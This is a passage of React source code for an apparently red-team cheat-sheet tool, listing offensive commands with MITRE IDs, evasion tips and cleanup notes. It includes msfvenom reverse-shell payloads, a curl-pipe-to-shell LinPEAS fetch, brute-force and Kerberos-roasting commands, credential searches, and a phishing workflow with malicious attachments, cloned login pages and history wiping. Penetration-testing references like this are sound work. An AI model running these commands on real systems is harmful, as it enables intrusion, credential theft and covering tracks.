'use client';

import { useState, useEffect, useRef } from 'react';
import { motion } from 'framer-motion';
import { 
  Bomb, 
  Server, 
  Shield, 
  Zap, 
  Search, 
  Copy, 
  ChevronRight, 
  ChevronDown,
  Terminal,
  ExternalLink,
  Database,
  Globe,
  Cloud,
  HelpCircle,
  ArrowRight,
  Check,
  Download,
  Code,
  Plus,
  Trash2,
  Mail,
  Eye,
  Lock,
  Wifi,
  Smartphone,
  Radio,
  Bug,
  AlertTriangle,
  FileText,
  Network,
  Cpu,
  HardDrive,
  Key,
  Users,
  Activity,
  Crosshair,
  Target,
  Layers,
  GitBranch,
  Wrench,
  Microscope,
  Brain,
  Skull,
  Filter
} from 'lucide-react';
import LiquidGlass from '@/components/ui/liquid-glass';


// Define cheatsheet data structure
interface Command {
  command: string;
  description: string;
  example?: string;
  mitreTechnique?: string;
  mitreId?: string;
  opsecNotes?: string;
  prerequisites?: string;
  riskLevel?: 'Low' | 'Medium' | 'High' | 'Critical';
  platform?: string[];
  category?: string;
  references?: string[];
  evasionTips?: string;
  detectionMethods?: string;
  cleanup?: string;
}

interface Subcategory {
  name: string;
  description: string;
  commands: Command[];
}

interface Category {
  name: string;
  icon: React.ReactNode;
  description: string;
  subcategories: Subcategory[];
}

// Define Command Generator types
interface CommandGeneratorQuestion {
  id: string;
  question: string;
  options?: string[];
  placeholder?: string;
  type: 'select' | 'text' | 'checkbox';
  dependsOn?: {
    questionId: string;
    values: string[];
  };
  advanced?: boolean;
}

interface GeneratedCommand {
  title: string;
  description: string;
  command: string;
  notes?: string;
  mitreTechnique?: string;
  mitreId?: string;
  cleanup?: string;
  opsecNotes?: string;
  evasionVariant?: string;
}

// Define all cheatsheet categories and commands based on 0xJs RedTeaming_CheatSheet
const cheatsheetData: Category[] = [
  {
    name: 'Infrastructure',
    icon: <Server className="w-5 h-5" />,
    description: 'Network and system attacks for initial access',
    subcategories: [
      {
        name: 'Enumeration',
        description: 'Discover and gather information about targets',
        commands: [
          {
            command: 'nmap -sV -sC -p- {target}',
            description: 'Full port scan with service detection and default scripts',
            example: 'nmap -sV -sC -p- 192.168.1.1',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Full port scan is noisy and easily detected',
            evasionTips: 'Use timing options (-T1 to -T3) and fragment packets (-f)',
            detectionMethods: 'IDS/IPS signatures, port scan detection tools'
          },
          {
            command: 'nmap -sn {network_range}',
            description: 'Network sweep/ping scan to identify live hosts',
            example: 'nmap -sn 192.168.1.0/24',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Ping sweeps are commonly logged and detected',
            evasionTips: 'Use -Pn to skip ping discovery, randomize timing with -T options',
            detectionMethods: 'ICMP monitoring, network behavior analysis'
          },
          {
            command: 'nmap --script vuln {target}',
            description: 'Scan for common vulnerabilities',
            example: 'nmap --script vuln 10.10.10.10',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.002',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Vulnerability scripts can trigger IDS/IPS alerts',
            evasionTips: 'Use specific scripts instead of vuln category, add delays',
            prerequisites: 'Nmap scripting engine (NSE) scripts installed'
          },
          {
            command: 'netdiscover -r {network_range}',
            description: 'Discover active hosts on the network',
            example: 'netdiscover -r 192.168.1.0/24',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Low',
            platform: ['Linux'],
            opsecNotes: 'ARP requests are visible to network monitoring tools',
            evasionTips: 'Use passive mode (-p) to avoid sending ARP requests',
            prerequisites: 'Root privileges for raw socket access'
          },
          {
            command: 'enum4linux -a {target}',
            description: 'Enumerate SMB shares on Windows/Samba systems',
            example: 'enum4linux -a 192.168.1.10',
            mitreTechnique: 'Network Share Discovery',
            mitreId: 'T1135',
            riskLevel: 'Medium',
            platform: ['Linux'],
            opsecNotes: 'SMB enumeration attempts are logged by Windows Event Log',
            evasionTips: 'Use null sessions carefully, avoid brute force attempts',
            detectionMethods: 'Windows Security Event ID 4625 (failed logons)'
          },
          {
            command: 'smbclient -L //{target}/ -N',
            description: 'List SMB shares anonymously',
            example: 'smbclient -L //192.168.1.10/ -N',
            mitreTechnique: 'Network Share Discovery',
            mitreId: 'T1135',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Anonymous SMB enumeration is logged by most systems'
          },
          {
            command: 'masscan -p1-65535 {target_range} --rate=1000',
            description: 'High-speed port scanner for large networks',
            example: 'masscan -p1-65535 192.168.1.0/24 --rate=1000',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'High',
            platform: ['Linux'],
            opsecNotes: 'Extremely fast and noisy, easily detected',
            evasionTips: 'Reduce rate and use source port randomization',
            prerequisites: 'Root privileges required'
          },
          {
            command: 'rustscan -a {target} -- -sV -sC',
            description: 'Fast port scanner with nmap integration',
            example: 'rustscan -a 192.168.1.1 -- -sV -sC',
            mitreTechnique: 'Network Service Discovery',
            mitreId: 'T1046',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://github.com/RustScan/RustScan']
          },
          {
            command: 'nuclei -t {template_path} -u {target}',
            description: 'Vulnerability scanner with community templates',
            example: 'nuclei -t /root/nuclei-templates/ -u https://example.com',
            mitreTechnique: 'Active Scanning',
            mitreId: 'T1595.002',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            references: ['https://github.com/projectdiscovery/nuclei']
          },
          {
            command: 'ldapsearch -x -H ldap://{target} -b "dc={domain},dc={tld}"',
            description: 'LDAP enumeration and information gathering',
            example: 'ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com"',
            mitreTechnique: 'Remote System Discovery',
            mitreId: 'T1018',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'LDAP queries are logged by domain controllers'
          }
        ]
      },
      {
        name: 'Exploitation',
        description: 'Tools and techniques for exploiting vulnerabilities',
        commands: [
          {
            command: 'searchsploit {search_term}',
            description: 'Search for exploits on Exploit-DB',
            example: 'searchsploit apache 2.4.49',
            mitreTechnique: 'Gather Victim Host Information',
            mitreId: 'T1592.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Offline tool, no network activity generated',
            prerequisites: 'Exploit-DB database installed locally',
            references: ['https://www.exploit-db.com/searchsploit']
          },
          {
            command: 'msfconsole',
            description: 'Launch Metasploit Framework console',
            example: 'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run"',
            mitreTechnique: 'Exploitation for Client Execution',
            mitreId: 'T1203',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Metasploit payloads are heavily signatured by AV',
            evasionTips: 'Use custom encoders, avoid default payloads, use evasion modules',
            prerequisites: 'Metasploit Framework installed'
          },
          {
            command: 'msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format}',
            description: 'Generate payload with MSFvenom',
            example: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe',
            mitreTechnique: 'Command and Scripting Interpreter',
            mitreId: 'T1059',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Default payloads are easily detected by modern AV',
            evasionTips: 'Use encoders (-e), iterations (-i), custom templates (-x)',
            cleanup: 'Remove payload files after use, clear command history'
          },
          {
            command: 'nc -nvlp {port}',
            description: 'Set up a netcat listener',
            example: 'nc -nvlp 4444',
            mitreTechnique: 'Non-Application Layer Protocol',
            mitreId: 'T1095',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Listening ports can be detected by port scans',
            evasionTips: 'Use non-standard ports, bind to specific interfaces',
            detectionMethods: 'Network monitoring, netstat analysis'
          },
          {
            command: 'hydra -l {username} -P {wordlist} {target} {service}',
            description: 'Brute force authentication with Hydra',
            example: 'hydra -l admin -P ./passwords.txt 192.168.1.1 ssh',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.001',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Brute force attempts are heavily logged and detected',
            evasionTips: 'Use delays (-w), limit attempts (-f), use proxy chains',
            detectionMethods: 'Failed authentication logs, account lockout policies'
          },
          {
            command: 'crackmapexec {protocol} {target} -u {username} -p {password}',
            description: 'Test credentials across multiple protocols',
            example: 'crackmapexec smb 192.168.1.0/24 -u admin -p password123',
            mitreTechnique: 'Valid Accounts',
            mitreId: 'T1078',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Authentication attempts are logged by target systems',
            evasionTips: 'Use --continue-on-success, limit concurrent threads',
            references: ['https://github.com/byt3bl33d3r/CrackMapExec']
          },
          {
            command: 'impacket-GetNPUsers {domain}/ -usersfile {users} -format hashcat -outputfile {output}',
            description: 'AS-REP Roasting attack',
            example: 'impacket-GetNPUsers contoso.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt',
            mitreTechnique: 'Steal or Forge Kerberos Tickets',
            mitreId: 'T1558.004',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Kerberos requests are logged by domain controllers',
            prerequisites: 'Valid domain user list, network access to DC',
            references: ['https://github.com/SecureAuthCorp/impacket']
          },
          {
            command: 'john --wordlist={wordlist} {hash_file}',
            description: 'Crack password hashes with John the Ripper',
            example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Offline attack, no network activity',
            evasionTips: 'Use custom rules, hybrid attacks, distributed cracking',
            prerequisites: 'Hash files obtained from target systems'
          },
          {
            command: 'hashcat -m {hash_type} {hash_file} {wordlist}',
            description: 'GPU-accelerated password cracking',
            example: 'hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt',
            mitreTechnique: 'Brute Force',
            mitreId: 'T1110.002',
            riskLevel: 'Low',
            platform: ['Linux', 'Windows'],
            opsecNotes: 'Offline attack, high GPU utilization may be noticeable',
            prerequisites: 'GPU with OpenCL/CUDA support, appropriate drivers',
            evasionTips: 'Use rule-based attacks, mask attacks for targeted cracking'
          }
        ]
      },
      {
        name: 'Privilege Escalation (Linux)',
        description: 'Techniques for escalating privileges on Linux systems',
        commands: [
          {
            command: 'sudo -l',
            description: 'List available sudo commands for the current user',
            example: 'sudo -l',
            mitreTechnique: 'Sudo and Sudo Caching',
            mitreId: 'T1548.003',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Command execution may be logged in auth.log',
            evasionTips: 'Check for NOPASSWD entries, wildcard permissions',
            detectionMethods: 'Sudo usage logs, authentication monitoring'
          },
          {
            command: 'find / -perm -u=s -type f 2>/dev/null',
            description: 'Find SUID binaries',
            example: 'find / -perm -u=s -type f 2>/dev/null | head -20',
            mitreTechnique: 'Setuid and Setgid',
            mitreId: 'T1548.001',
            riskLevel: 'Medium',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'File system traversal may trigger monitoring',
            evasionTips: 'Focus on non-standard SUID binaries, check GTFOBins',
            references: ['https://gtfobins.github.io/']
          },
          {
            command: 'cat /etc/crontab',
            description: 'Check for scheduled tasks that may be hijacked',
            example: 'cat /etc/crontab && ls -la /etc/cron.*/',
            mitreTechnique: 'Scheduled Task/Job',
            mitreId: 'T1053.003',
            riskLevel: 'Medium',
            platform: ['Linux'],
            opsecNotes: 'File access may be logged by file integrity monitoring',
            evasionTips: 'Check user crontabs, look for writable cron scripts',
            detectionMethods: 'File access monitoring, cron job analysis'
          },
          {
            command: 'linpeas.sh',
            description: 'Run LinPEAS for Linux privilege escalation enumeration',
            example: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
            mitreTechnique: 'System Information Discovery',
            mitreId: 'T1082',
            riskLevel: 'Medium',
            platform: ['Linux'],
            opsecNotes: 'Comprehensive enumeration may trigger EDR alerts',
            evasionTips: 'Use -q for quiet mode, redirect output to avoid detection',
            references: ['https://github.com/carlospolop/PEASS-ng']
          },
          {
            command: 'grep -v -E "^#" /etc/passwd | awk -F: \'$3 == 0 { print $1}\'',
            description: 'Find all users with UID 0 (root equivalent)',
            example: 'grep -v -E "^#" /etc/passwd | awk -F: \'$3 == 0 { print $1}\'',
            mitreTechnique: 'Account Discovery',
            mitreId: 'T1087.001',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'File access is typically not logged for /etc/passwd',
            evasionTips: 'Check for hidden users, unusual UID assignments'
          },
          {
            command: 'find / -writable -type d 2>/dev/null',
            description: 'Find world-writable directories',
            example: 'find / -writable -type d 2>/dev/null | grep -v proc | head -10',
            mitreTechnique: 'File and Directory Discovery',
            mitreId: 'T1083',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Extensive file system searches may be detected',
            evasionTips: 'Focus on specific directories, avoid full system scans'
          },
          {
            command: 'getcap -r / 2>/dev/null',
            description: 'Find files with capabilities set',
            example: 'getcap -r / 2>/dev/null | grep -v "= $"',
            mitreTechnique: 'Abuse Elevation Control Mechanism',
            mitreId: 'T1548',
            riskLevel: 'Medium',
            platform: ['Linux'],
            opsecNotes: 'Capability enumeration may trigger security monitoring',
            evasionTips: 'Look for cap_setuid, cap_dac_override capabilities',
            prerequisites: 'libcap-dev package installed for getcap command'
          },
          {
            command: 'ps aux | grep root',
            description: 'List processes running as root',
            example: 'ps aux | grep root | grep -v "\\[.*\\]"',
            mitreTechnique: 'Process Discovery',
            mitreId: 'T1057',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Process enumeration is typically not logged',
            evasionTips: 'Look for unusual services, check process arguments'
          },
          {
            command: 'netstat -tulpn',
            description: 'Show network connections and listening ports',
            example: 'netstat -tulpn | grep LISTEN',
            mitreTechnique: 'System Network Connections Discovery',
            mitreId: 'T1049',
            riskLevel: 'Low',
            platform: ['Linux'],
            opsecNotes: 'Network enumeration is rarely logged',
            evasionTips: 'Look for internal services, unusual port bindings',
            detectionMethods: 'Network monitoring, anomaly detection'
          },
          {
            command: 'cat /etc/passwd | grep -v nologin',
            description: 'Find users with login shells',
            example: 'cat /etc/passwd | grep -v nologin | grep -v false | cut -d: -f1',
            mitreTechnique: 'Account Discovery',
            mitreId: 'T1087.001',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Standard file access, typically not monitored',
            evasionTips: 'Check for service accounts with shells, unusual users'
          },
          {
            command: 'find / -name "*.conf" -exec ls -la {} \\; 2>/dev/null',
            description: 'Find configuration files',
            example: 'find /etc /opt /var -name "*.conf" -type f 2>/dev/null | head -20',
            mitreTechnique: 'File and Directory Discovery',
            mitreId: 'T1083',
            riskLevel: 'Low',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'File system searches may be logged by file integrity monitoring',
            evasionTips: 'Focus on specific directories, check for sensitive configs'
          },
          {
            command: 'find / -name "authorized_keys" 2>/dev/null',
            description: 'Find SSH authorized_keys files',
            example: 'find /home /root -name "authorized_keys" -type f 2>/dev/null',
            mitreTechnique: 'Unsecured Credentials',
            mitreId: 'T1552.004',
            riskLevel: 'Medium',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'SSH key discovery may indicate lateral movement attempts',
            evasionTips: 'Check for backup keys, unusual key locations',
            detectionMethods: 'File access monitoring, SSH key management tools'
          },
          {
            command: 'find / -name "id_rsa" 2>/dev/null',
            description: 'Find SSH private keys',
            example: 'find /home /root /opt -name "id_*" -type f 2>/dev/null',
            mitreTechnique: 'Private Keys',
            mitreId: 'T1552.004',
            riskLevel: 'High',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Private key access is critical security event',
            evasionTips: 'Look for keys in unusual locations, check permissions',
            detectionMethods: 'File access monitoring, key management systems',
            cleanup: 'Avoid copying keys, use in-place if possible'
          }
        ]
      },
      {
        name: 'Privilege Escalation (Windows)',
        description: 'Techniques for escalating privileges on Windows systems',
        commands: [
          {
            command: 'winPEAS.exe',
            description: 'Run WinPEAS for Windows privilege escalation enumeration',
            example: 'winPEAS.exe quiet cmd fast',
            mitreTechnique: 'System Information Discovery',
            mitreId: 'T1082',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'Comprehensive enumeration may trigger EDR alerts',
            evasionTips: 'Use quiet mode, redirect output to avoid detection',
            references: ['https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS']
          },
          {
            command: 'PowerUp.ps1 Invoke-AllChecks',
            description: 'Run PowerUp checks for common Windows privesc paths',
            example: 'powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"',
            mitreTechnique: 'Abuse Elevation Control Mechanism',
            mitreId: 'T1548',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'PowerShell execution may be logged and monitored',
            evasionTips: 'Use AMSI bypass, obfuscate PowerShell commands',
            references: ['https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1']
          },
          {
            command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
            description: 'Check for AlwaysInstallElevated registry setting',
            example: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
            mitreTechnique: 'Abuse Elevation Control Mechanism',
            mitreId: 'T1548.002',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Registry queries are typically logged',
            evasionTips: 'Check both HKLM and HKCU, create MSI payload if enabled'
          },
          {
            command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"',
            description: 'Find services with unquoted paths',
            example: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v "c:\\program files"',
            mitreTechnique: 'Hijack Execution Flow',
            mitreId: 'T1574.009',
            riskLevel: 'High',
            platform: ['Windows'],
            opsecNotes: 'Service enumeration may be logged by security tools',
            evasionTips: 'Look for services with spaces in paths, check write permissions'
          },
          {
            command: 'sc qc {servicename}',
            description: 'Query configuration of a Windows service',
            example: 'sc qc spooler',
            mitreTechnique: 'System Services',
            mitreId: 'T1007',
            riskLevel: 'Low',
            platform: ['Windows'],
            opsecNotes: 'Service queries are typically not heavily monitored',
            evasionTips: 'Check service permissions, binary path, and dependencies'
          },
          {
            command: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
            description: 'Check for services Authenticated Users can modify',
            example: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula 2>nul',
            mitreTechnique: 'System Services',
            mitreId: 'T1007',
            riskLevel: 'Medium',
            platform: ['Windows'],
            opsecNotes: 'AccessChk execution may be detected by EDR',
            prerequisites: 'AccessChk from Sysinternals suite',
            references: ['https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk']
          },
          {
            command: 'whoami /priv',
            description: 'Check current user privileges',
            example: 'whoami /priv | findstr /i "SeImpersonatePrivilege\\|SeAssignPrimaryTokenPrivilege\\|SeBackupPrivilege\\|SeRestorePrivilege"',
            mitreTechnique: 'System Information Discovery',
            mitreId: 'T1082',
            riskLevel: 'Low',
            platform: ['Windows'],
            opsecNotes: 'Standard Windows command, typically not monitored',
            evasionTips: 'Look for dangerous privileges like SeImpersonatePrivilege'
          },
          {
            command: 'whoami /groups',
            description: 'Check current user group memberships',
            example: 'whoami /groups | findstr /i "administrators\\|backup\\|remote"',
            mitreTechnique: 'System Information Discovery',
            mitreId: 'T1082',
            riskLevel: 'Low',
            platform: ['Windows'],
            opsecNotes: 'Standard Windows command, typically not monitored',
            evasionTips: 'Look for privileged groups and special access rights'
          },
          {
            command: 'net localgroup administrators',
            description: 'List local administrators',
            example: 'net localgroup administrators',
            mitreTechnique: 'Account Discovery',
            mitreId: 'T1087.001',
            riskLevel: 'Low',
            platform: ['Windows'],
            opsecNotes: 'Standard administrative command, may be logged',
            evasionTips: 'Check for unusual admin accounts, service accounts'
          },
          {
            command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services',
            description: 'Enumerate all services',
          },
          {
            command: 'schtasks /query /fo LIST /v',
            description: 'List all scheduled tasks',
          },
          {
            command: 'dir /s *pass* == *cred* == *vnc* == *.config*',
            description: 'Search for files containing passwords or credentials',
          },
          {
            command: 'findstr /si password *.xml *.ini *.txt',
            description: 'Search for password strings in files',
          },
          {
            command: 'reg query HKLM /f password /t REG_SZ /s',
            description: 'Search registry for password entries',
          }
        ]
      },
      {
        name: 'Pivoting',
        description: 'Techniques for pivoting through compromised hosts',
        commands: [
          {
            command: 'ssh -L {local_port}:{remote_host}:{remote_port} {user}@{ssh_server}',
            description: 'SSH local port forwarding',
            example: 'ssh -L 8080:internal-app:80 user@compromised-host',
            mitreTechnique: 'Protocol Tunneling',
            mitreId: 'T1572',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'SSH connections are logged, unusual port forwards may be detected',
            evasionTips: 'Use common ports, limit connection duration',
            detectionMethods: 'SSH log analysis, network flow monitoring'
          },
          {
            command: 'ssh -D {local_port} {user}@{ssh_server}',
            description: 'SSH dynamic port forwarding (SOCKS proxy)',
            example: 'ssh -D 1080 user@compromised-host',
            mitreTechnique: 'Protocol Tunneling',
            mitreId: 'T1572',
            riskLevel: 'Medium',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'SOCKS proxy usage can be detected by network monitoring',
            evasionTips: 'Use with proxychains, rotate proxy endpoints',
            cleanup: 'Terminate SSH sessions, clear connection logs'
          },
          {
            command: 'ssh -R {remote_port}:{local_host}:{local_port} {user}@{ssh_server}',
            description: 'SSH remote port forwarding',
            example: 'ssh -R 8080:localhost:80 user@public-server',
            mitreTechnique: 'Protocol Tunneling',
            mitreId: 'T1572',
            riskLevel: 'High',
            platform: ['Linux', 'Windows', 'macOS'],
            opsecNotes: 'Reverse tunnels are highly suspicious and monitored',
            evasionTips: 'Use legitimate-looking services, limit bandwidth',
            detectionMethods: 'Outbound connection monitoring, SSH log analysis'
          },
          {
            command: 'proxychains {command}',
            description: 'Route command through proxy defined in proxychains.conf',
            example: 'proxychains nmap -sT -Pn 10.10.10.10',
            mitreTechnique: 'Proxy',
            mitreId: 'T1090',
            riskLevel: 'Medium',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Proxy usage patterns can be detected',
            evasionTips: 'Use multiple proxy chains, randomize timing',
            prerequisites: 'Proxychains configuration file setup'
          },
          {
            command: 'socat TCP-LISTEN:{local_port},fork TCP:{target}:{target_port}',
            description: 'Create a relay with socat',
            example: 'socat TCP-LISTEN:8080,fork TCP:internal-server:80',
            mitreTechnique: 'Protocol Tunneling',
            mitreId: 'T1572',
            riskLevel: 'Medium',
            platform: ['Linux', 'macOS'],
            opsecNotes: 'Port relays can be detected by network monitoring',
            evasionTips: 'Use common ports, implement connection limits',
            cleanup: 'Kill socat processes, clear network connections'
          }
        ]
      }
    ]
  },
  {
    name: 'Phishing',
    icon: <Mail className="w-5 h-5" />,
    description: 'Email phishing attack techniques and frameworks',
    subcategories: [
      {
        name: 'Infrastructure Setup',
        description: 'Setting up phishing infrastructure',
        commands: [
          {
            command: 'git clone https://github.com/gophish/gophish.git',
            description: 'Clone the GoPhish repository',
          },
          {
            command: 'cd gophish && go build',
            description: 'Build GoPhish from source',
          },
          {
            command: './gophish',
            description: 'Run GoPhish server (default admin credentials: admin:gophish)',
          },
          {
            command: 'docker run -d -p 3333:3333 -p 8080:80 -p 8443:443 gophish/gophish',
            description: 'Run GoPhish using Docker',
          },
          {
            command: 'docker run -d --name evilginx2 -p 80:80 -p 443:443 kgretzky/evilginx2',
            description: 'Run Evilginx2 phishing proxy',
          }
        ]
      },
      {
        name: 'Email Configuration',
        description: 'Setting up email sending capabilities',
        commands: [
          {
            command: 'sudo apt-get install postfix',
            description: 'Install Postfix mail server on Linux',
          },
          {
            command: 'nano /etc/postfix/main.cf',
            description: 'Edit Postfix configuration file',
          },
          {
            command: 'echo "myhostname = phishing-server.com" >> /etc/postfix/main.cf',
            description: 'Set hostname for Postfix',
          },
          {
            command: 'openssl s_client -connect smtp.gmail.com:587 -starttls smtp',
            description: 'Test SMTP connection with TLS',
          },
          {
            command: 'swaks --to target@example.com --from attacker@example.com --server mail.example.com --body "Test message"',
            description: 'Test email sending with SWAKS tool',
            example: 'swaks --to victim@company.com --from hr@company.com --server 192.168.1.10 --body "Please reset your password"'
          }
        ]
      },
      {
        name: 'Target Reconnaissance',
        description: 'Gathering information about phishing targets',
        commands: [
          {
            command: 'theHarvester -d {domain} -l 500 -b google,linkedin',
            description: 'Collect email addresses from a domain',
            example: 'theHarvester -d company.com -l 500 -b google,linkedin'
          },
          {
            command: 'curl -s "https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"',
            description: 'Find email addresses using Hunter.io API',
            example: 'curl -s "https://api.hunter.io/v2/domain-search?domain=company.com&api_key=your-api-key"'
          },
          {
            command: 'git clone https://github.com/laramies/theHarvester.git',
            description: 'Clone theHarvester for email gathering',
          },
          {
            command: 'linkedin2username -c {company_name}',
            description: 'Generate potential usernames from LinkedIn profiles',
            example: 'linkedin2username -c "Target Company"'
          },
          {
            command: 'whois {domain} | grep "Admin Email"',
            description: 'Find admin contact email from WHOIS records',
            example: 'whois company.com | grep "Admin Email"'
          }
        ]
      },
      {
        name: 'Content Creation',
        description: 'Creating convincing phishing content',
        commands: [
          {
            command: 'wget -r -l1 -k -p {target_website}',
            description: 'Clone a website for phishing template',
            example: 'wget -r -l1 -k -p https://login.company.com'
          },
          {
            command: 'sed -i \'s/action="[^"]*"/action="post.php"/g\' login.html',
            description: 'Modify form action in cloned page',
          },
          {
            command: 'msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT=443 -f exe > attachment.exe',
            description: 'Create malicious attachment for phishing',
            example: 'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe > attachment.exe'
          },
          {
            command: 'echo \'<?php header("Location: https://legitimate-site.com"); ?>\' > redirect.php',
            description: 'Create redirect script for after credential capture',
          },
          {
            command: 'macro_pack -t WORD -o -G payload.doc',
            description: 'Create malicious Office document with macro',
          }
        ]
      },
      {
        name: 'Campaign Execution',
        description: 'Launching and managing phishing campaigns',
        commands: [
          {
            command: 'gophish campaigns new',
            description: 'Create a new campaign in GoPhish CLI',
          },
          {
            command: 'python3 -m SimpleHTTPServer 80',
            description: 'Start simple web server for phishing page',
          },
          {
            command: 'netcat -lvnp 8080',
            description: 'Set up listener for captured credentials',
          },
          {
            command: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST {ip}; set LPORT 443; run"',
            description: 'Set up Metasploit handler for payload',
            example: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; run"'
          },
          {
            command: 'sendEmail -f sender@example.com -t targets.txt -u "Urgent: Action Required" -m "Please click the link: http://phish.example.com" -s smtp.example.com:25',
            description: 'Send phishing emails with sendEmail tool',
          }
        ]
      },
      {
        name: 'Analysis & Reporting',
        description: 'Tracking and analyzing phishing campaign results',
        commands: [
          {
            command: 'grep -r "password" /var/log/apache2/',
            description: 'Search web server logs for captured credentials',
          },
          {
            command: 'tail -f phishing-results.log',
            description: 'Monitor real-time campaign results',
          },
          {
            command: 'sqlite3 gophish.db "SELECT * FROM results;"',
            description: 'Query GoPhish database for campaign results',
          },
          {
            command: 'python3 -c "import json; data=json.load(open(\'results.json\')); print(f\'Success rate: {len([x for x in data if x[\"clicked\"]])/len(data)*100}%\')"',
            description: 'Calculate click rate from results JSON',
          },
          {
            command: 'echo \'{"campaign":"Q4 Security Test","targets":500,"clicks":125,"creds":75}\' > report.json',
            description: 'Create campaign summary report',
          }
        ]
      },
      {
        name: 'Cleanup',
        description: 'Securely removing evidence after campaign completion',
        commands: [
          {
            command: 'docker stop gophish && docker rm gophish',
            description: 'Stop and remove GoPhish Docker container',
          },
          {
            command: 'find /var/www/phishing -type f -exec shred -n 3 -z -u {} \\;',
            description: 'Securely delete phishing website files',
          },
          {
            command: 'systemctl stop postfix && apt-get purge postfix',
            description: 'Stop and remove mail server',
          },
          {
            command: 'history -c && rm ~/.bash_history',
            description: 'Clear command history',
          },
          {
            command: 'tar -czf campaign_results.tar.gz ./results/ && gpg -c campaign_results.tar.gz && shred -n 3 -z -u campaign_results.tar.gz',
            description: 'Securely archive and encrypt campaign results',
          }
        ]
      }
    ]
  },
  {
    name: 'Windows AD',
    icon: <Database className="w-5 h-5" />,
    description: 'Active Directory attacks and techniques',
    subcategories: [
      {
        name: 'Initial Access',
        description: 'Techniques for gaining initial access to an AD environment',
        commands: [
          {
            command: 'crackmapexec smb {target} -u {user} -p {password}',
            description: 'Test SMB credentials against target',
            example: 'crackmapexec smb 192.168.1.0/24 -u admin -p password'
          },
          {
            command: 'evil-winrm -i {target} -u {user} -p {password}',
            description: 'Connect to WinRM using credentials',
            example: 'evil-winrm -i 192.168.1.10 -u administrator -p password'
          },
          {
